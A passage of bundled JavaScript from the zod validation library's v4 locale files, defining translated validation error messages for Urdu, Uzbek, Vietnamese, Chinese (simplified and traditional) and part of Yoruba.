    ipv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    cidrv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0631\u06CC\u0646\u062C",
    cidrv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0631\u06CC\u0646\u062C",
    base64: "\u0628\u06CC\u0633 64 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    base64url: "\u0628\u06CC\u0633 64 \u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    json_string: "\u062C\u06D2 \u0627\u06CC\u0633 \u0627\u0648 \u0627\u06CC\u0646 \u0633\u0679\u0631\u0646\u06AF",
    e164: "\u0627\u06CC 164 \u0646\u0645\u0628\u0631",
    jwt: "\u062C\u06D2 \u0688\u0628\u0644\u06CC\u0648 \u0679\u06CC",
    template_literal: "\u0627\u0646 \u067E\u0679"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0646\u0645\u0628\u0631",
    array: "\u0622\u0631\u06D2",
    null: "\u0646\u0644"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: instanceof ${issue2.expected} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627\u060C ${received} \u0645\u0648\u0635\u0648\u0644 \u06C1\u0648\u0627`;
        }
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${expected} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627\u060C ${received} \u0645\u0648\u0635\u0648\u0644 \u06C1\u0648\u0627`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${stringifyPrimitive(issue2.values[0])} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
        return `\u063A\u0644\u0637 \u0622\u067E\u0634\u0646: ${joinValues(issue2.values, "|")} \u0645\u06CC\u06BA \u0633\u06D2 \u0627\u06CC\u06A9 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue2.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u06D2 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0627\u0635\u0631"} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue2.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u0627 ${adj}${issue2.maximum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue2.origin} \u06A9\u06D2 ${adj}${issue2.minimum.toString()} ${sizing.unit} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        }
        return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue2.origin} \u06A9\u0627 ${adj}${issue2.minimum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.prefix}" \u0633\u06D2 \u0634\u0631\u0648\u0639 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        }
        if (_issue.format === "ends_with")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.suffix}" \u067E\u0631 \u062E\u062A\u0645 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "includes")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.includes}" \u0634\u0627\u0645\u0644 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "regex")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: \u067E\u06CC\u0679\u0631\u0646 ${_issue.pattern} \u0633\u06D2 \u0645\u06CC\u0686 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        return `\u063A\u0644\u0637 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u063A\u0644\u0637 \u0646\u0645\u0628\u0631: ${issue2.divisor} \u06A9\u0627 \u0645\u0636\u0627\u0639\u0641 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
      case "unrecognized_keys":
        return `\u063A\u06CC\u0631 \u062A\u0633\u0644\u06CC\u0645 \u0634\u062F\u06C1 \u06A9\u06CC${issue2.keys.length > 1 ? "\u0632" : ""}: ${joinValues(issue2.keys, "\u060C ")}`;
      case "invalid_key":
        return `${issue2.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u06A9\u06CC`;
      case "invalid_union":
        return "\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679";
      case "invalid_element":
        return `${issue2.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u0648\u06CC\u0644\u06CC\u0648`;
      default:
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679`;
    }
  };
};
function ur_default() {
  return {
    localeError: error42()
  };
}
// node_modules/zod/v4/locales/uz.js
var error43 = () => {
  const Sizable = {
    string: { unit: "belgi", verb: "bo\u2018lishi kerak" },
    file: { unit: "bayt", verb: "bo\u2018lishi kerak" },
    array: { unit: "element", verb: "bo\u2018lishi kerak" },
    set: { unit: "element", verb: "bo\u2018lishi kerak" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "kirish",
    email: "elektron pochta manzili",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO sana va vaqti",
    date: "ISO sana",
    time: "ISO vaqt",
    duration: "ISO davomiylik",
    ipv4: "IPv4 manzil",
    ipv6: "IPv6 manzil",
    mac: "MAC manzil",
    cidrv4: "IPv4 diapazon",
    cidrv6: "IPv6 diapazon",
    base64: "base64 kodlangan satr",
    base64url: "base64url kodlangan satr",
    json_string: "JSON satr",
    e164: "E.164 raqam",
    jwt: "JWT",
    template_literal: "kirish"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "raqam",
    array: "massiv"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Noto\u2018g\u2018ri kirish: kutilgan instanceof ${issue2.expected}, qabul qilingan ${received}`;
        }
        return `Noto\u2018g\u2018ri kirish: kutilgan ${expected}, qabul qilingan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Noto\u2018g\u2018ri kirish: kutilgan ${stringifyPrimitive(issue2.values[0])}`;
        return `Noto\u2018g\u2018ri variant: quyidagilardan biri kutilgan ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Juda katta: kutilgan ${issue2.origin ?? "qiymat"} ${adj}${issue2.maximum.toString()} ${sizing.unit} ${sizing.verb}`;
        return `Juda katta: kutilgan ${issue2.origin ?? "qiymat"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Juda kichik: kutilgan ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} ${sizing.verb}`;
        }
        return `Juda kichik: kutilgan ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Noto\u2018g\u2018ri satr: "${_issue.prefix}" bilan boshlanishi kerak`;
        if (_issue.format === "ends_with")
          return `Noto\u2018g\u2018ri satr: "${_issue.suffix}" bilan tugashi kerak`;
        if (_issue.format === "includes")
          return `Noto\u2018g\u2018ri satr: "${_issue.includes}" ni o\u2018z ichiga olishi kerak`;
        if (_issue.format === "regex")
          return `Noto\u2018g\u2018ri satr: ${_issue.pattern} shabloniga mos kelishi kerak`;
        return `Noto\u2018g\u2018ri ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Noto\u2018g\u2018ri raqam: ${issue2.divisor} ning karralisi bo\u2018lishi kerak`;
      case "unrecognized_keys":
        return `Noma\u2019lum kalit${issue2.keys.length > 1 ? "lar" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} dagi kalit noto\u2018g\u2018ri`;
      case "invalid_union":
        return "Noto\u2018g\u2018ri kirish";
      case "invalid_element":
        return `${issue2.origin} da noto\u2018g\u2018ri qiymat`;
      default:
        return `Noto\u2018g\u2018ri kirish`;
    }
  };
};
function uz_default() {
  return {
    localeError: error43()
  };
}
// node_modules/zod/v4/locales/vi.js
var error44 = () => {
  const Sizable = {
    string: { unit: "k\xFD t\u1EF1", verb: "c\xF3" },
    file: { unit: "byte", verb: "c\xF3" },
    array: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" },
    set: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0111\u1EA7u v\xE0o",
    email: "\u0111\u1ECBa ch\u1EC9 email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ng\xE0y gi\u1EDD ISO",
    date: "ng\xE0y ISO",
    time: "gi\u1EDD ISO",
    duration: "kho\u1EA3ng th\u1EDDi gian ISO",
    ipv4: "\u0111\u1ECBa ch\u1EC9 IPv4",
    ipv6: "\u0111\u1ECBa ch\u1EC9 IPv6",
    cidrv4: "d\u1EA3i IPv4",
    cidrv6: "d\u1EA3i IPv6",
    base64: "chu\u1ED7i m\xE3 h\xF3a base64",
    base64url: "chu\u1ED7i m\xE3 h\xF3a base64url",
    json_string: "chu\u1ED7i JSON",
    e164: "s\u1ED1 E.164",
    jwt: "JWT",
    template_literal: "\u0111\u1EA7u v\xE0o"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "s\u1ED1",
    array: "m\u1EA3ng"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i instanceof ${issue2.expected}, nh\u1EADn \u0111\u01B0\u1EE3c ${received}`;
        }
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${expected}, nh\u1EADn \u0111\u01B0\u1EE3c ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${stringifyPrimitive(issue2.values[0])}`;
        return `T\xF9y ch\u1ECDn kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i m\u1ED9t trong c\xE1c gi\xE1 tr\u1ECB ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue2.origin ?? "gi\xE1 tr\u1ECB"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "ph\u1EA7n t\u1EED"}`;
        return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue2.origin ?? "gi\xE1 tr\u1ECB"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i b\u1EAFt \u0111\u1EA7u b\u1EB1ng "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i k\u1EBFt th\xFAc b\u1EB1ng "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i bao g\u1ED3m "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i kh\u1EDBp v\u1EDBi m\u1EABu ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} kh\xF4ng h\u1EE3p l\u1EC7`;
      }
      case "not_multiple_of":
        return `S\u1ED1 kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i l\xE0 b\u1ED9i s\u1ED1 c\u1EE7a ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Kh\xF3a kh\xF4ng \u0111\u01B0\u1EE3c nh\u1EADn d\u1EA1ng: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Kh\xF3a kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue2.origin}`;
      case "invalid_union":
        return "\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7";
      case "invalid_element":
        return `Gi\xE1 tr\u1ECB kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue2.origin}`;
      default:
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7`;
    }
  };
};
function vi_default() {
  return {
    localeError: error44()
  };
}
// node_modules/zod/v4/locales/zh-CN.js
var error45 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u7B26", verb: "\u5305\u542B" },
    file: { unit: "\u5B57\u8282", verb: "\u5305\u542B" },
    array: { unit: "\u9879", verb: "\u5305\u542B" },
    set: { unit: "\u9879", verb: "\u5305\u542B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u8F93\u5165",
    email: "\u7535\u5B50\u90AE\u4EF6",
    url: "URL",
    emoji: "\u8868\u60C5\u7B26\u53F7",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u671F\u65F6\u95F4",
    date: "ISO\u65E5\u671F",
    time: "ISO\u65F6\u95F4",
    duration: "ISO\u65F6\u957F",
    ipv4: "IPv4\u5730\u5740",
    ipv6: "IPv6\u5730\u5740",
    cidrv4: "IPv4\u7F51\u6BB5",
    cidrv6: "IPv6\u7F51\u6BB5",
    base64: "base64\u7F16\u7801\u5B57\u7B26\u4E32",
    base64url: "base64url\u7F16\u7801\u5B57\u7B26\u4E32",
    json_string: "JSON\u5B57\u7B26\u4E32",
    e164: "E.164\u53F7\u7801",
    jwt: "JWT",
    template_literal: "\u8F93\u5165"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u6570\u5B57",
    array: "\u6570\u7EC4",
    null: "\u7A7A\u503C(null)"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B instanceof ${issue2.expected}\uFF0C\u5B9E\u9645\u63A5\u6536 ${received}`;
        }
        return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${expected}\uFF0C\u5B9E\u9645\u63A5\u6536 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${stringifyPrimitive(issue2.values[0])}`;
        return `\u65E0\u6548\u9009\u9879\uFF1A\u671F\u671B\u4EE5\u4E0B\u4E4B\u4E00 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue2.origin ?? "\u503C"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u4E2A\u5143\u7D20"}`;
        return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue2.origin ?? "\u503C"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.prefix}" \u5F00\u5934`;
        if (_issue.format === "ends_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.suffix}" \u7ED3\u5C3E`;
        if (_issue.format === "includes")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u6EE1\u8DB3\u6B63\u5219\u8868\u8FBE\u5F0F ${_issue.pattern}`;
        return `\u65E0\u6548${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u65E0\u6548\u6570\u5B57\uFF1A\u5FC5\u987B\u662F ${issue2.divisor} \u7684\u500D\u6570`;
      case "unrecognized_keys":
        return `\u51FA\u73B0\u672A\u77E5\u7684\u952E(key): ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} \u4E2D\u7684\u952E(key)\u65E0\u6548`;
      case "invalid_union":
        return "\u65E0\u6548\u8F93\u5165";
      case "invalid_element":
        return `${issue2.origin} \u4E2D\u5305\u542B\u65E0\u6548\u503C(value)`;
      default:
        return `\u65E0\u6548\u8F93\u5165`;
    }
  };
};
function zh_CN_default() {
  return {
    localeError: error45()
  };
}
// node_modules/zod/v4/locales/zh-TW.js
var error46 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u5143", verb: "\u64C1\u6709" },
    file: { unit: "\u4F4D\u5143\u7D44", verb: "\u64C1\u6709" },
    array: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" },
    set: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u8F38\u5165",
    email: "\u90F5\u4EF6\u5730\u5740",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u65E5\u671F\u6642\u9593",
    date: "ISO \u65E5\u671F",
    time: "ISO \u6642\u9593",
    duration: "ISO \u671F\u9593",
    ipv4: "IPv4 \u4F4D\u5740",
    ipv6: "IPv6 \u4F4D\u5740",
    cidrv4: "IPv4 \u7BC4\u570D",
    cidrv6: "IPv6 \u7BC4\u570D",
    base64: "base64 \u7DE8\u78BC\u5B57\u4E32",
    base64url: "base64url \u7DE8\u78BC\u5B57\u4E32",
    json_string: "JSON \u5B57\u4E32",
    e164: "E.164 \u6578\u503C",
    jwt: "JWT",
    template_literal: "\u8F38\u5165"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA instanceof ${issue2.expected}\uFF0C\u4F46\u6536\u5230 ${received}`;
        }
        return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${expected}\uFF0C\u4F46\u6536\u5230 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${stringifyPrimitive(issue2.values[0])}`;
        return `\u7121\u6548\u7684\u9078\u9805\uFF1A\u9810\u671F\u70BA\u4EE5\u4E0B\u5176\u4E2D\u4E4B\u4E00 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue2.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u500B\u5143\u7D20"}`;
        return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue2.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue2.origin} \u61C9\u70BA ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue2.origin} \u61C9\u70BA ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.prefix}" \u958B\u982D`;
        }
        if (_issue.format === "ends_with")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.suffix}" \u7D50\u5C3E`;
        if (_issue.format === "includes")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u7B26\u5408\u683C\u5F0F ${_issue.pattern}`;
        return `\u7121\u6548\u7684 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u7121\u6548\u7684\u6578\u5B57\uFF1A\u5FC5\u9808\u70BA ${issue2.divisor} \u7684\u500D\u6578`;
      case "unrecognized_keys":
        return `\u7121\u6CD5\u8B58\u5225\u7684\u9375\u503C${issue2.keys.length > 1 ? "\u5011" : ""}\uFF1A${joinValues(issue2.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue2.origin} \u4E2D\u6709\u7121\u6548\u7684\u9375\u503C`;
      case "invalid_union":
        return "\u7121\u6548\u7684\u8F38\u5165\u503C";
      case "invalid_element":
        return `${issue2.origin} \u4E2D\u6709\u7121\u6548\u7684\u503C`;
      default:
        return `\u7121\u6548\u7684\u8F38\u5165\u503C`;
    }
  };
};
function zh_TW_default() {
  return {
    localeError: error46()
  };
}
// node_modules/zod/v4/locales/yo.js
var error47 = () => {
  const Sizable = {
    string: { unit: "\xE0mi", verb: "n\xED" },
    file: { unit: "bytes", verb: "n\xED" },
    array: { unit: "nkan", verb: "n\xED" },
    set: { unit: "nkan", verb: "n\xED" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9",
    email: "\xE0d\xEDr\u1EB9\u0301s\xEC \xECm\u1EB9\u0301l\xEC",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\xE0k\xF3k\xF2 ISO",
    date: "\u1ECDj\u1ECD\u0301 ISO",
    time: "\xE0k\xF3k\xF2 ISO",
    duration: "\xE0k\xF3k\xF2 t\xF3 p\xE9 ISO",
    ipv4: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv4",
    ipv6: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv6",
    cidrv4: "\xE0gb\xE8gb\xE8 IPv4",
    cidrv6: "\xE0gb\xE8gb\xE8 IPv6",
    base64: "\u1ECD\u0300r\u1ECD\u0300 t\xED a k\u1ECD\u0301 n\xED base64",
    base64url: "\u1ECD\u0300r\u1ECD\u0300 base64url",
    json_string: "\u1ECD\u0300r\u1ECD\u0300 JSON",
    e164: "n\u1ECD\u0301mb\xE0 E.164",
    jwt: "JWT",
    template_literal: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "n\u1ECD\u0301mb\xE0",
    array: "akop\u1ECD"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi instanceof ${issue2.expected}, \xE0m\u1ECD\u0300 a r\xED ${received}`;
        }
        return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${expected}, \xE0m\u1ECD\u0300 a r\xED ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${stringifyPrimitive(issue2.values[0])}`;
        return `\xC0\u1E63\xE0y\xE0n a\u1E63\xEC\u1E63e: yan \u1ECD\u0300kan l\xE1ra ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue2.origin ?? "iye"} ${sizing.verb} ${adj}${issue2.maximum} ${sizing.unit}`;
        return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue2.maximum}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum} ${sizing.unit}`;
        return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue2.minimum}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\u1EB9\u0300r\u1EB9\u0300 p\u1EB9\u0300l\xFA "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
